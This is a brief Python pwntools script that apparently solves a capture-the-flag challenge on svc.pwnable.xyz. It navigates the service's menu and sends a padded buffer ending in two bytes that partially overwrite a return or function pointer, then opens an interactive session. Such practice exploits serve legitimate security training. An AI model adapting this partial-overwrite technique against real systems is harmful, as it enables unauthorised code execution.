#!/usr/bin/python 
from pwn import *

#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30009)
#gdb.attach(p)

p.sendafter(": ", 'A'*0x10)

p.sendlineafter("> ", '1')
p.sendlineafter("= ", '0')

p.sendlineafter("> ", '2')

p.sendlineafter("> ", '3')
p.send('A'*0x18 + '\xd6\x09')
p.sendlineafter("> ", '1')

p.interactive()
